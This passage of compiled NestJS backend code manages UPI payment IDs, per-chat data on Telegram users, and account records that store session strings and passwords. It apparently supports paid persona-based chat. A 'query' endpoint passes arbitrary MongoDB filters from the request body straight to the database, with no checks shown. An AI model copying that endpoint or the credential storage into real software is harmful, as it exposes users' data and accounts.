        const result = await this.UpiIdModel.findOne({}).lean().exec();
        if (result) {
            this.upiIds = result;
        }
    }
    async checkNpoint() {
        const upiIds = (await axios_1.default.get('https://api.npoint.io/54baf762fd873c55c6b1')).data;
        const existingUpiIds = await this.findOne();
        if ((0, utils_1.areJsonsNotSame)(upiIds, existingUpiIds)) {
            await this.npointSerive.updateDocument("54baf762fd873c55c6b1", existingUpiIds);
        }
    }
    async findOne() {
        if (Object.keys(this.upiIds).length > 0) {
            return this.upiIds;
        }
        const result = await this.UpiIdModel.findOne({}).lean().exec();
        if (!result)
            return null;
        this.upiIds = result;
        console.log("Refreshed UPIs");
        return result;
    }
    async update(updateClientDto) {
        delete updateClientDto['_id'];
        const updatedUser = await this.UpiIdModel.findOneAndUpdate({}, { $set: { ...updateClientDto } }, { new: true, upsert: true, lean: true }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`UpiIdModel not found`);
        }
        this.upiIds = updatedUser;
        console.log("Refreshed UPIs");
        return updatedUser;
    }
};
exports.UpiIdService = UpiIdService;
exports.UpiIdService = UpiIdService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('UpiIdModule')),
    __metadata("design:paramtypes", [mongoose_2.Model,
        npoint_service_1.NpointService])
], UpiIdService);


/***/ }),

/***/ "./src/components/user-data/dto/create-user-data.dto.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/dto/create-user-data.dto.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateUserDataDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateUserDataDto {
}
exports.CreateUserDataDto = CreateUserDataDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '5787751360', description: 'Chat ID' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1, description: 'Total count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Picture count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "picCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1718802722566, description: 'Last message timestamp' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1718802742567, description: 'Limit time' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "limitTime", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Paid count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "paidCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Profile count' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "prfCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1, description: 'Can reply' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "canReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'Pay amount' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'highestPayAmount' }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "highestPayAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'cheatCount', default: 0 }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "cheatCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 0, description: 'callTime', default: 0 }),
    __metadata("design:type", Number)
], CreateUserDataDto.prototype, "callTime", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'بـِـعٰ۬ێډ الۿٰٕقاوٰ۬ێ ٴ🦅', description: 'Username' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: '-7250939091939055173', description: 'Access hash' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "accessHash", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid reply status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Demo given status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second show status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'sneha', description: 'Profile name' }),
    __metadata("design:type", String)
], CreateUserDataDto.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Pics Sent status' }),
    __metadata("design:type", Boolean)
], CreateUserDataDto.prototype, "picsSent", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: [], description: 'videos' }),
    __metadata("design:type", Array)
], CreateUserDataDto.prototype, "videos", void 0);


/***/ }),

/***/ "./src/components/user-data/dto/search-user-data.dto.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/dto/search-user-data.dto.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
class SearchDto {
}
exports.SearchDto = SearchDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Total count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Picture count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "picCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Last message timestamp', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Limit time', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "limitTime", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Paid count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "paidCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Profile count', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "prfCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Can reply', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "canReply", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Pay amount', type: Number }),
    __metadata("design:type", Number)
], SearchDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Username' }),
    __metadata("design:type", String)
], SearchDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Access hash' }),
    __metadata("design:type", String)
], SearchDto.prototype, "accessHash", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Paid reply status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Demo given status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Second show status', type: Boolean }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Profile name' }),
    (0, class_transformer_1.Transform)(({ value }) => value?.trim().toLowerCase()),
    __metadata("design:type", String)
], SearchDto.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Chat ID' }),
    __metadata("design:type", String)
], SearchDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Pics Sent status' }),
    __metadata("design:type", Boolean)
], SearchDto.prototype, "picsSent", void 0);


/***/ }),

/***/ "./src/components/user-data/dto/update-user-data.dto.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/dto/update-user-data.dto.ts ***!
  \**************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateUserDataDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_user_data_dto_1 = __webpack_require__(/*! ./create-user-data.dto */ "./src/components/user-data/dto/create-user-data.dto.ts");
class UpdateUserDataDto extends (0, swagger_1.PartialType)(create_user_data_dto_1.CreateUserDataDto) {
}
exports.UpdateUserDataDto = UpdateUserDataDto;


/***/ }),

/***/ "./src/components/user-data/schemas/user-data.schema.ts":
/*!**************************************************************!*\
  !*** ./src/components/user-data/schemas/user-data.schema.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataSchema = exports.UserData = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
let UserData = class UserData {
};
exports.UserData = UserData;
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "chatId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "totalCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "picCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "lastMsgTimeStamp", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "limitTime", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "paidCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "prfCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "canReply", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "payAmount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "username", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "accessHash", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "paidReply", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "demoGiven", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "secondShow", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, default: 0 }),
    __metadata("design:type", Number)
], UserData.prototype, "fullShow", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], UserData.prototype, "profile", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], UserData.prototype, "picSent", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "highestPayAmount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "cheatCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], UserData.prototype, "callTime", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, default: [] }),
    __metadata("design:type", Array)
], UserData.prototype, "videos", void 0);
exports.UserData = UserData = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'userData', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], UserData);
exports.UserDataSchema = mongoose_1.SchemaFactory.createForClass(UserData);


/***/ }),

/***/ "./src/components/user-data/user-data.controller.ts":
/*!**********************************************************!*\
  !*** ./src/components/user-data/user-data.controller.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const user_data_service_1 = __webpack_require__(/*! ./user-data.service */ "./src/components/user-data/user-data.service.ts");
const create_user_data_dto_1 = __webpack_require__(/*! ./dto/create-user-data.dto */ "./src/components/user-data/dto/create-user-data.dto.ts");
const search_user_data_dto_1 = __webpack_require__(/*! ./dto/search-user-data.dto */ "./src/components/user-data/dto/search-user-data.dto.ts");
const update_user_data_dto_1 = __webpack_require__(/*! ./dto/update-user-data.dto */ "./src/components/user-data/dto/update-user-data.dto.ts");
let UserDataController = class UserDataController {
    constructor(userDataService) {
        this.userDataService = userDataService;
    }
    async create(createUserDataDto) {
        return this.userDataService.create(createUserDataDto);
    }
    async search(query) {
        return this.userDataService.search(query);
    }
    async findAll() {
        return this.userDataService.findAll();
    }
    async updateAll(chatId, updateUserDataDto) {
        return this.userDataService.updateAll(chatId, updateUserDataDto);
    }
    async findOne(profile, chatId) {
        return this.userDataService.findOne(profile, chatId);
    }
    async update(profile, chatId, updateUserDataDto) {
        return this.userDataService.update(profile, chatId, updateUserDataDto);
    }
    async remove(profile, chatId) {
        return this.userDataService.remove(profile, chatId);
    }
    clearCount(chatId) {
        return this.userDataService.clearCount(chatId);
    }
    async executeQuery(requestBody) {
        try {
            const { query, sort, limit, skip } = requestBody;
            return await this.userDataService.executeQuery(query, sort, limit, skip);
        }
        catch (error) {
            throw error;
        }
    }
};
exports.UserDataController = UserDataController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_user_data_dto_1.CreateUserDataDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    (0, swagger_1.ApiQuery)({ name: 'profile', required: false, description: 'User profile' }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: false, description: 'Chat ID' }),
    (0, swagger_1.ApiQuery)({ name: 'isTesting', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'banned', required: false, type: Boolean }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_user_data_dto_1.SearchDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "findAll", null);
__decorate([
    (0, common_1.Patch)('updateAll/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_user_data_dto_1.UpdateUserDataDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "updateAll", null);
__decorate([
    (0, common_1.Get)(':profile/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('profile')),
    __param(1, (0, common_1.Param)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':profile/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('profile')),
    __param(1, (0, common_1.Param)('chatId')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, update_user_data_dto_1.UpdateUserDataDto]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':profile/:chatId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    __param(0, (0, common_1.Param)('profile')),
    __param(1, (0, common_1.Param)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "remove", null);
__decorate([
    (0, common_1.Get)('clear-count'),
    __param(0, (0, common_1.Query)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", void 0)
], UserDataController.prototype, "clearCount", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], UserDataController.prototype, "executeQuery", null);
exports.UserDataController = UserDataController = __decorate([
    (0, swagger_1.ApiTags)('UserData of TG clients'),
    (0, common_1.Controller)('userData'),
    __metadata("design:paramtypes", [user_data_service_1.UserDataService])
], UserDataController);


/***/ }),

/***/ "./src/components/user-data/user-data.module.ts":
/*!******************************************************!*\
  !*** ./src/components/user-data/user-data.module.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const user_data_schema_1 = __webpack_require__(/*! ./schemas/user-data.schema */ "./src/components/user-data/schemas/user-data.schema.ts");
const user_data_service_1 = __webpack_require__(/*! ./user-data.service */ "./src/components/user-data/user-data.service.ts");
const user_data_controller_1 = __webpack_require__(/*! ./user-data.controller */ "./src/components/user-data/user-data.controller.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let UserDataModule = class UserDataModule {
};
exports.UserDataModule = UserDataModule;
exports.UserDataModule = UserDataModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: user_data_schema_1.UserData.name, schema: user_data_schema_1.UserDataSchema, collection: "userData" }])
        ],
        controllers: [user_data_controller_1.UserDataController],
        providers: [user_data_service_1.UserDataService],
        exports: [user_data_service_1.UserDataService]
    })
], UserDataModule);


/***/ }),

/***/ "./src/components/user-data/user-data.service.ts":
/*!*******************************************************!*\
  !*** ./src/components/user-data/user-data.service.ts ***!
  \*******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UserDataService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const user_data_schema_1 = __webpack_require__(/*! ./schemas/user-data.schema */ "./src/components/user-data/schemas/user-data.schema.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
let UserDataService = class UserDataService {
    constructor(userDataModel) {
        this.userDataModel = userDataModel;
        this.callCounts = new Map();
    }
    async create(createUserDataDto) {
        const createdUser = new this.userDataModel(createUserDataDto);
        return createdUser.save();
    }
    async findAll() {
        return await this.userDataModel.find().exec();
    }
    async findOne(profile, chatId) {
        const user = (await this.userDataModel.findOne({ profile, chatId }).exec())?.toJSON();
        if (!user) {
            console.warn(`UserData with ID "${profile} - ${chatId}" not found`);
        }
        const currentCount = this.callCounts.get(chatId) || 0;
        this.callCounts.set(chatId, currentCount + 1);
        if (user) {
            return { ...user, count: this.callCounts.get(chatId) };
        }
        else {
            return undefined;
        }
    }
    clearCount(chatId) {
        if (chatId) {
            this.callCounts.delete(chatId);
            return `Count cleared for chatId: ${chatId}`;
        }
        else {
            this.callCounts.clear();
            return 'All counts cleared.';
        }
    }
    async update(profile, chatId, updateUserDataDto) {
        delete updateUserDataDto['_id'];
        console.log(updateUserDataDto);
        const updatedUser = await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();
        if (!updatedUser) {
            console.warn(`UserData with ID "${chatId}" not found`);
        }
        return updatedUser;
    }
    async updateAll(chatId, updateUserDataDto) {
        delete updateUserDataDto['_id'];
        const updatedUser = await this.userDataModel.updateMany({ chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();
        if (!updatedUser) {
            console.warn(`UserData with ID "${chatId}" not found`);
        }
        return updatedUser;
    }
    async remove(profile, chatId) {
        const deletedUser = await this.userDataModel.findOneAndDelete({ profile, chatId }).exec();
        if (!deletedUser) {
            console.warn(`UserData with ID "${chatId}" not found`);
        }
        return deletedUser;
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.userDataModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.userDataModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async resetPaidUsers() {
        try {
            const entry = await this.userDataModel.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 30 } }] }, {
                $set: {
                    totalCount: 10,
                    limitTime: Date.now(),
                    paidReply: true
                }
            });
        }
        catch (error) {
            (0, parseError_1.parseError)(error);
        }
    }
};
exports.UserDataService = UserDataService;
exports.UserDataService = UserDataService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(user_data_schema_1.UserData.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], UserDataService);


/***/ }),

/***/ "./src/components/users/dto/create-user.dto.ts":
/*!*****************************************************!*\
  !*** ./src/components/users/dto/create-user.dto.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateUserDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateUserDto {
    constructor() {
        this.twoFA = false;
        this.expired = false;
        this.password = null;
        this.movieCount = 0;
        this.photoCount = 0;
        this.videoCount = 0;
        this.otherPhotoCount = 0;
        this.otherVideoCount = 0;
        this.ownPhotoCount = 0;
        this.ownVideoCount = 0;
        this.contacts = 0;
    }
}
exports.CreateUserDto = CreateUserDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Mobile number of the user', example: '917330803480' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Session information of the user', example: 'string' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'First name of the user', example: 'Praveen' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "firstName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last name of the user', example: null }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "lastName", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Username of the user', example: null }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of channels', example: 56 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of personal chats', example: 74 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "personalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Number of messages', example: 0 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "msgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Total number of chats', example: 195 }),
    __metadata("design:type", Number)
], CreateUserDto.prototype, "totalChats", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Timestamp of last active', example: '2024-06-03' }),
    __metadata("design:type", String)
], CreateUserDto.prototype, "lastActive", void 0);
__decorate([
